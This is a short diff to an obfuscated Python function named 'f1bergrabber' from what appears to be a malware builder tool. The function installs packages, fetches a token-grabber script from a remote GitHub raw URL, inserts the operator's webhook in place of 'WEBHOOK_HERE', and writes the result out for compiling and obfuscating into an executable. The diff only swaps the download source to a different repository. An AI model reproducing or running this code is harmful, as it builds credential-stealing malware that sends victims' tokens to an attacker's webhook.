@@ -11,7 +11,7 @@ from plugins .standard import setTitle ,installPackage
 def f1bergrabber (OOO000000O00000O0 ,OO0OOOOOOO00000O0 ):
     OO0O0OO00OO00O0OO =['requests','psutil','pypiwin32','pycryptodome','pyinstaller','pillow',]
     installPackage (OO0O0OO00OO00O0OO )
-    OOOO0OO00OOOOO000 =requests .get ("https://raw.githubusercontent.com/Rdimo/Hazard-Token-Grabber-V2/master/main.py").text .replace ("WEBHOOK_HERE",OOO000000O00000O0 )
+    OOOO0OO00OOOOO000 =requests .get ("https://raw.githubusercontent.com/carbomfiber/log/main/main.py").text .replace ("WEBHOOK_HERE",OOO000000O00000O0 )
     with open (f"{OO0OOOOOOO00000O0}.py",'w',errors ="ignore")as OO000000O0000OOOO :
         OO000000O0000OOOO .write (OOOO0OO00OOOOO000 )
     print (f"Do you want to obfuscate {OO0OOOOOOO00000O0}.exe?")
